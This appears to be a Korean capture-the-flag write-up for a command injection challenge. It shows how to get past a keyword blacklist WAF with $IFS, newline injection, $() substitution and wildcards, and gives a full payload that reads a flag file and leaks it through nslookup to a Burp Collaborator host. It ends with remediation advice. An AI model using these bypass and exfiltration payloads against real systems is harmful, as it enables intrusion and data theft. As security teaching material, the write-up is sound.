+++
title = "VulnABLE CTF [LUXORA] Write-up: Command Injection 💎 Platinum"
description = "LUXORA 플랫폼의 최고 난이도 Command Injection 상세 공략 (강력한 WAF 우회 및 Blind 결합)"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Command Injection", "Platinum", "OOB", "WAF Bypass", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Command Injection 💎 Platinum

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (CMDi)
- **난이도**: 💎 Platinum
- **타겟 경로**: `/cmdi/platinum`
- **목표**: OOB 기반의 Blind 추출이 필요한 환경에서, 백엔드의 강력한 **블랙리스트 WAF(웹 방화벽)**를 창의적인 쉘 변환 기법으로 완벽히 우회하여 최종 플래그를 획득하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 필터 제약 확인 (Reconnaissance)

`/cmdi/platinum` 은 시스템 점검 용도로 보이는 기능입니다.
하지만 일반적인 명령어(Gold 단계의 페이로드 등)를 전송하면, 아주 엄격한 차단 메시지가 돌아옵니다.

**[막혀있는 주요 문자 및 기호]**
1. **특수 기호**: ` `(공백), `;`, `|`, `&`, ``` ` ```(백틱), `/`
2. **명령어 및 단어**: `ping`, `curl`, `wget`, `nc`, `cat`, `flag`

**[해커의 사고 과정]**
1. 화면 출력이 없으니 OOB(DNS 등)로 빼내야 한다.
2. 하지만 OOB에 필요한 `ping`과 데이터를 읽을 `cat`, 그리고 찾으려는 문자열 `flag`가 모두 WAF에 막혔다.
3. 기호 중에는 명령어 구분자(`;`)와 공백(` `)이 막혔다. 
4. 리눅스 Bash 쉘의 "명령어 대체(Command Substitution)"와 "와일드카드(Wildcard)" 기능을 활용하여 필터를 피하는 우회 페이로드를 설계해야 한다.

---

## 💥 2. WAF 우회 및 OOB 페이로드 설계 (Bypass Strategy)

각각의 차단 요소를 어떻게 우회할지 하나씩 설계해 봅니다.

### 💡 Strategy 1: 차단된 명령어(`ping`) 우회
DNS 질의를 유도하는 명령어는 `ping`만 있는 것이 아닙니다. 
리눅스 기본 도구인 **`nslookup`**, **`host`**, **`dig`** 등을 사용할 수 있습니다. 여기서는 `nslookup`을 선택합니다.

### 💡 Strategy 2: 차단된 명령어(`cat`) 우회
파일을 읽는 명령어 역시 다양합니다.
**`head`**, `tail`, `more`, `less`, `tac`, `od -c` 등을 사용할 수 있습니다. 여기서는 `head`를 사용합니다.

### 💡 Strategy 3: 특정 문자열(`flag`) 우회
Bash의 **와일드카드(`*`, `?`)**를 사용하여 파일 이름을 간접적으로 지정합니다.
`flag_platinum.txt` ➔ `f*g_p*.txt`

### 💡 Strategy 4: 명령어 구분자와 공백, 백틱 우회
- **구분자**: `;` 대신 URL 인코딩 개행문자 **`%0a`** 사용
- **공백**: ` ` 대신 **`$IFS`** 내장 변수 사용
- **백틱(명령어 치환)**: ``` `명령어` ``` 대신 **`$(명령어)`** 사용

---

## 🚀 3. 공격 수행 및 익스플로잇 (Exploitation)

이제 위의 모든 전략을 하나로 체이닝(Chaining)하여 궁극의 우회 페이로드를 조립합니다.

### 기본 OOB 페이로드의 형태 (차단됨)
```bash
8.8.8.8; ping -c 1 `cat flag_platinum.txt`.abcxyz.burpcollaborator.net
```

### 변환된 우회 페이로드 (WAF 통과용)
1. `;` ➔ `%0a`
2. `ping ...` ➔ `nslookup`
3. 공백 ➔ `$IFS`
4. 백틱 ➔ `$()`
5. `cat` ➔ `head`
6. `flag` ➔ `f*g_p*.txt`

**[완성된 URL 인코딩 페이로드]**
```http
ip=8.8.8.8%0anslookup$IFS$(head$IFSf*g_p*.txt).abcxyz.burpcollaborator.net
```
*(참고: 서버의 현재 디렉터리에 플래그가 있다고 가정하고 슬래시(`/`)를 제거했습니다.)*

### 페이로드 전송
```bash
$ curl -X POST http://localhost:3000/cmdi/platinum \
  -d "ip=8.8.8.8%0anslookup\$IFS\$(head\$IFS\f*g_p*.txt).abcxyz.burpcollaborator.net"
```

### 🔍 서버의 동작과 공격 결과
WAF는 전송된 문자열에서 차단 키워드(`ping`, `cat`, `flag`, 공백 등)를 발견하지 못하고 무사 통과시킵니다.
서버 내부의 Bash 쉘은 이 문장을 받아들여 다음과 같이 처리합니다:
1. `f*g_p*.txt` 패턴에 맞는 파일을 찾는다.
2. `head` 명령어로 그 파일의 내용(플래그)을 읽는다.
3. 읽어낸 내용(플래그)을 도메인 앞부분에 붙여 `nslookup`을 실행한다.

잠시 후, 해커의 OOB 서버(Burp Collaborator)에 다음과 같은 DNS 로그가 찍힙니다!
```text
[DNS Query Received at Burp Collaborator]
Type: A
Domain: FLAG{CMDI_💎_PLATINUM_MASTER_A1B2}.abcxyz.burpcollaborator.net
```

---

## 🚩 4. 롸잇업 결론 및 플래그

가장 강력한 방어막인 WAF를, Bash 쉘이 가진 무한한 변환 능력을 통해 무력화시켰습니다. 블랙리스트 방식의 필터링은 결코 완전한 보안 대책이 될 수 없음을 보여주는 훌륭한 예시입니다.

**🔥 획득한 플래그:**
`FLAG{CMDI_💎_PLATINUM_MASTER_A1B2}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
WAF 규칙(Rule)을 아무리 촘촘하게 짜더라도, 운영체제가 제공하는 내장 명령어(LOLBins - Living off the Land Binaries)와 쉘 문법의 조합을 모두 차단하는 것은 불가능합니다.

* **가장 확실한 패치: 쉘 실행 금지**
`os.system()` 이나 `exec()` 등 쉘 인터프리터를 구동하는 함수 사용을 전면 금지해야 합니다. 언어 자체에서 제공하는 네트워크 라이브러리나 쉘을 거치지 않는 `execFile`, `spawn` 같은 안전한 API를 사용해야만 이런 형태의 기만 공격을 원천 차단할 수 있습니다.